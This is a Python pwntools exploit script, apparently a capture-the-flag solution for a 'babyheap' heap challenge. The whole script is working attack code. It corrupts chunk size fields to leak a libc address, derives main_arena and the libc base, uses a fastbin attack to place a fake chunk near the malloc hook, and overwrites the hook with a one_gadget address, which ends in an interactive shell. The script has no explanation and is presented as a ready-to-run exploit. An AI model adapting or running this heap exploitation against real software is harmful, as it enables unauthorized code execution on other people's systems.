from pwn import *
#context(log_level='debug')

DEBUG = 1
if DEBUG:
    p = process('./babyheap')
    libc = ELF('libc.so.6')
else:
    p = remote()

def alloc(size):
    p.recvuntil('Command:')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))

def fill(index, size, content):
    p.recvuntil('Command:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.send(content)

def free(index):
    p.recvuntil('Command:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def dump(index):
    p.recvuntil('Command:')
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(index))


alloc(0x60)
alloc(0x40)
payload = 'a'*0x60+p64(0)+p64(0x71)
fill(0,len(payload),payload)
alloc(0x100)
payload = 'a'*0x10+p64(0)+p64(0x71)
fill(2,len(payload),payload)
#gdb.attach(p)
free(1)
alloc(0x60)
payload = 'a'*0x40+p64(0)+p64(0x111)
fill(1,len(payload),payload)
alloc(0x80)
free(2)
dump(1)

p.recvuntil(': \n')
leak_addr = u64(p.recvline()[-9:-1])
log.success('leak_addr :'+hex(leak_addr))
main_arena_addr = leak_addr-(0x7f50c7832b78-0x7f50c7832b20)
log.success('main_arena_addr :'+hex(main_arena_addr))
libc_base =leak_addr -(0x7f50c7832b78-0x7f50c746e000)
log.success('libc_base :'+hex(libc_base))


free(1)
fake_chunk_addr = main_arena_addr - 0x23

fill(0, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(fake_chunk_addr) + p64(0))
alloc(0x60)
alloc(0x60)

one_gadget_addr = libc_base + 0x4526a
payload = 0x3 * 'a' + p64(one_gadget_addr)
fill(2, len(payload), payload)
alloc(0x100)
#gdb.attach(p)



p.interactive()